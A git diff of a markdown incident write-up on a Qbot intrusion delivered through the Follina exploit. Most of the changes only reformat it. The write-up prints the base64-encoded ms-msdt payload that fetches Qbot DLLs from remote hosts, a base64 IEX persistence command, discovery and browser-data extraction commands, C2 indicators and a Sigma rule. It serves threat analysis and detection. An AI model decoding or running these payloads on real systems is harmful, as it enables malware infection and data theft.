@@ -22,39 +22,35 @@ In this intrusion:
 ## Case summary
 
 1. threat actor (TA) abused the CVE-2022-30190 (Follina) vulnerability
- 1. expoit code in malicious word document to gain initial access
- 2. likely arrived by the means of [thread-hijacked emails from distribution channels used by TA570](https://isc.sans.edu/diary/TA570+Qakbot+%28Qbot%29+tries+CVE-2022-30190+%28Follina%29+exploit+%28ms-msdt%29/28728).
+1. expoit code in malicious word document to gain initial access
+2. likely arrived by the means of [thread-hijacked emails from distribution channels used by TA570](https://isc.sans.edu/diary/TA570+Qakbot+%28Qbot%29+tries+CVE-2022-30190+%28Follina%29+exploit+%28ms-msdt%29/28728).
 3. Weaponized Word document got executed
- 1. HTML file was retrieved from a remote server containing a PowerShell payload
- 2. Payload contained base64-encoded content => to download Qbot DDLs inside the user's Temp directory
+1. HTML file was retrieved from a remote server containing a PowerShell payload
+2. Payload contained base64-encoded content => to download Qbot DDLs inside the user's Temp directory
 3. Qbot DLL executed via regsvr32.exe
- 1. was then injected into legitimate processes (explorer.exe) on the host
+1. was then injected into legitimate processes (explorer.exe) on the host
 2. Injected process spawned Windows utilities such as `whoami`, `net.exe` and `nslookup` for discovery and to establish connection to the Qbot C2 servers
 3. Approx. an hour later: leverage of the Windows built-in utility `esentutl.exe` to extract browser data
 4. Qbot used scheduled task creation as a persistence mechanism
- 1. contained PowerShell command referencing multiple C2 IP addresses stored as base64-encoded blob in randomly named keys under the HKCU registry hive.
+1. contained PowerShell command referencing multiple C2 IP addresses stored as base64-encoded blob in randomly named keys under the HKCU registry hive.
 2. TA proceeded with remote creation of Qbot DLLs over SMB to other hosts throughout the environment
 3. TA added folders to the Microsoft Defender exlusions list on each of the infected machines to evade defenses
 4. Remote services were then used in a similar fashion to execute the DLLs
 5. Cobalt Strike server connection was witnessed within the first hour, but wasn't ustilised untill the lateral movement phase
- 2. `nltest.exe` and `AdFind` were executed by the injected Cobalt Strike process (explorer.exe)
- 3. also used to access the LSASS system process
+2. `nltest.exe` and `AdFind` were executed by the injected Cobalt Strike process (explorer.exe)
+3. also used to access the LSASS system process
 4. TA installed remote management tool called `Netsupport Manager`
 5. TA moved laterally to the domain controller via Remote Desktop session
 6. On the DC
- 1. A tool called `Atera Remote Management` was deployed (popular tool to control victim machines)
+1. A tool called `Atera Remote Management` was deployed (popular tool to control victim machines)
 2. Next day: TA downloaded a tool named `Network Scanner` by SoftPerfect on the DC
- 1. Execution ran a port scan across the network
+1. Execution ran a port scan across the network
 2. TA connected to one of the file share servers via RDP and accessed sensitive documents
 3. No further activity was observed before the TA got evicted from the domain.
 
 ### Timeline
 
-
-
 ### Infection graph
-
-
 
 ## Step-by-step
 
@@ -72,7 +68,7 @@ These can be extracted as usual. An important file for the analysis of a Follina
 At the bottom of the retrieved HTML page, a script tag with malicious JavaScript code that called the `ms-msdt` scheme was found:
 (Code is in Base64 as to not trigger Defender)
 
-```
+```Base64
 bXMtbXNkdDovaWQgUENXRGlhZ25vc3RpYyAvc2tpcCBmb3JjZSAvcGFyYW0gIklUX1JlYnJvd3NlRm9yRmlsZT0/IElUX0xhdW5jaE1ldGhvZD1Db250ZXh0TWVudSBJVF9Ccm93c2VGb3JGaWxlPSQoSW52b2tlLUV4cHJlc3Npb24oJChJbnZva2UtRXhwcmVzc2lvbignW1N5c3RlbS5UZXh0LkVuY29kaW5nXScrW2NoYXJdNTgrW2NoYXJdNTgrJ1VuaWNvZGUuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF0nK1tjaGFyXTU4K1tjaGFyXTU4KydGcm9tQmFzZTY0U3RyaW5nKCcrW2NoYXJdMzQKKydKQUJ3QUNBQVBRQWdBQ1FBUlFCdUFIWUFPZ0IwQUdVQWJRQndBRHNBYVFCM0FISUFJQUJvQUhRQWRBQndBRG9BTHdBdkFERUFNQUEwQUM0QU13QTJBQzRBTWdBeUFEa0FMZ0F4QURNQU9RQXZBQ1FBS0FCeUFHRUFiZ0JrQUc4QWJRQXBBQzRBWkFCaEFIUUFJQUF0QUU4QWRRQjBBRVlBYVFCc0FHVUFJQUFrQUhBQVhBQjBBQzRBUVFBN0FHa0Fkd0J5QUNBQWFBQjBBSFFBY0FBNkFDOEFMd0E0QURVQUxnQXlBRE1BT1FBdUFEVUFOUUF1QURJQU1nQTRBQzhBSkFBb0FISUFZUUJ1QUdRQWJ3QnRBQ2tBTGdCa0FHRUFkQUFnQUMwQVR3QjFBSFFBUmdCcEFHd0FaUUFnQUNRQWNBQmNBSFFBTVFBdUFFRUFPd0JwQUhjQWNnQWdBR2dBZEFCMEFIQUFPZ0F2QUM4QU1RQTRBRFVBTGdBeUFETUFOQUF1QURJQU5BQTNBQzRBTVFBeEFEa0FMd0FrQUNnQWNnQmhBRzRBWkFCdkFHMEFLUUF1QUdRQVlRQjBBQ0FBTFFCUEFIVUFkQUJHQUdrQWJBQmxBQ0FBSkFCd0FGd0FkQUF5QUM0QVFRQTdBSElBWlFCbkFITUFkZ0J5QURNQU1nQWdBQ1FBY0FCY0FIUUFMZ0JCQURzQWNnQmxBR2NBY3dCMkFISUFNd0F5QUNBQUpBQndBRndBZEFBeEFDNEFRUUE3QUhJQVpRQm5BSE1BZGdCeUFETUFNZ0FnQUNRQWNBQmNBSFFBTWdBdUFFRUEnK1tjaGFyXTM0KycpKScpKSkpaS8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9XaW5kb3dzL1N5c3RlbTMyL21wc2lnc3R1Yi5leGUi
 ```
 
@@ -95,7 +91,8 @@ MSDT payload
 
 1. Scheduled tasks accross multiple endpoints
 (Code is in Base64 as to not trigger Defender)
-```
+
+```Base64
 c2NodGFza3MuZXhlIC9DcmVhdGUgL0YgL1ROICJ7RTlBREVBMzctQzMyOS00OTY3LTlDRjUtMjY4MkRBN0Q5N0JFfSIgL1RSICJjbWQgL2Mgc3RhcnQgL21pbiBcIlwiIHBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kIElFWChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlxTT0ZUV0FSRVxCZW5mb3VxY2dxKS5yeGZ0ZWpraHlkbndtcHQpKSk=
 ```
 
@@ -105,30 +102,34 @@ c2NodGFza3MuZXhlIC9DcmVhdGUgL0YgL1ROICJ7RTlBREVBMzctQzMyOS00OTY3LTlDRjUtMjY4MkRB
  2. Data in registry key consisted of base64-encoded string
  3. Decoding the the base64-encoded string revealed QBot's C2 IPv4 addresses and ports
 
-2. `SysWow64\Explorer.exe` process was also observed cycling through a number of domains – indicated by the DNS requests with a QueryStatus of RCODE:0 (NO ERROR).
-3. several connectivity checks were made to email relay services
+ 2. `SysWow64\Explorer.exe` process was also observed cycling through a number of domains – indicated by the DNS requests with a QueryStatus of RCODE:0 (NO ERROR).
+ 3. several connectivity checks were made to email relay services
 
 ### Defense Evasion
+
 - Process hollowing - 32-bit version of explorer.exe in suspended state
-- Analysis: Volatility and malfind module 
+- Analysis: Volatility and malfind module
 - Checking injected PIDs and Volatility netscan module --> dicovery of Qbot and Cobalt strike
 - Various folders (dropzones for Qbot) were added as an exclusion for Windows Defender
 
 ### Credential access
+
 - attempt to steal credentials from the Credentials Manager --> ***Detection*** read operation on stored credentials in Credential Manager logged in Security logs
 - ***Detection*** following access levels are often linked to Credential dumping tools like Mimikatz
 - ***Detection*** significant amount of volume of events by explorer process for LSASS interacions with access right: 0x1FFFFF (PROCESS_ALL_ACCESS)
-```
+
+```shell
 PROCESS_VM_READ (0x0010)
 PROCESS_QUERY_INFORMATION (0x0400)
 PROCESS_QUERY_LIMITED_INFORMATION (0x1000)
 PROCESS_ALL_ACCESS (0x1fffff)
 ```
 
-
 ### Discovery
+
 - Discovery commands used by Qbot through injected process on beachhead system:
-```
+
+```shell
 whoami /all
 cmd /c set
 net view /all
@@ -145,25 +146,30 @@ C:\Windows\System32\cmd.exe /C c:\windows\sysnative\nltest.exe /domain_trusts /a
 
 - Discovery commands from Cobalt Strike
 
-```
+```shell
 net group "domain controllers" /dom
 net group "domain admins" /dom
 C:\Windows\system32\cmd.exe /C ping -n 1 <Redacted>
 ```
+
 - `AdFind`
 - Network Scaner by SoftPerfect `netscan.exe` on the Domain Controller, downloaded using IE, used to port scan on TCP 445 and 3389
 
 ### Lateral Movement
+
 - DLLs for Qbot were sent from the beachhead host to other hosts on the network through SMB traffic
 - RDP to pivot between systems on the network (DC, file server)
 - ***Detection*** start of the `rdpclip.exe` by non-human account
 
 ### Collection
+
 - QBot collection modules on beachhead modules
 - `esentutl.exe` to extract browser data from IE and Edge
+
 ```
 esentutl.exe /r V01 /l"C:\Users\<redacted>\AppData\Local\Microsoft\Windows\WebCache" /s"C:\Users\<redacted>\AppData\Local\Microsoft\Windows\WebCache" /d"C:\Users\<redacted>\AppData\Local\Microsoft\Windows\WebCache"
 ```
+
 - `OpenWith` process for viewing PDF
 
 ### Command and Control
@@ -180,13 +186,13 @@ Sensitive documents (.pdf, .docx) were viewed in a RDP session on the file serve
 
 - ATERA Integrator Login ID
 
-```
+```txt
 cadencefitzp.atrickzx@gmail[.]com
 ```
 
 - DNS Requests
 
-```
+```txt
 www.stanzatextbooks[.]com
 www.framemymirror[.]com
 www.coolwick[.]com
@@ -205,7 +211,7 @@ atlasbar[.]net
 
 - Qbot C2 IP’s observed in traffic
 
-```
+```txt
 144[.]202[.]3[.]39:443
 67[.]209[.]195[.]198:443
 176[.]67[.]56[.]94:443
@@ -219,13 +225,13 @@ atlasbar[.]net
 
 - Cobalt Strike
 
-```
+```txt
 190[.]123[.]44[.]126:443
 ```
 
 - Qbot C2 IPv4s in registry key
 
-```
+```txt
 38[.]70[.]253[.]226:2222
 182[.]191[.]92[.]203:995
 37[.]186[.]54[.]254:995
@@ -374,7 +380,7 @@ atlasbar[.]net
 
 - Files
 
-```
+```txt
 liidfxngjotktx.dll
 5abb2c12f066ce32a0e4866fb5bb347f
 dab316b8973ecc9a1893061b649443f5358b0e64
@@ -395,7 +401,7 @@ f76954b68cc390f8009f1a052283a740
 
 #### Network
 
-```
+```txt
 ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
 ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
 ET POLICY SMB Executable File Transfer
@@ -414,7 +420,7 @@ ET CNC Feodo Tracker Reported CnC Server group 20
 
 #### Sigma
 
-```
+```Sigma
 title: Potential Qbot SMB DLL Lateral Movement
 id: 3eaa2cee-2dfb-46e9-98f6-3782aab30f38
 status: Experimental
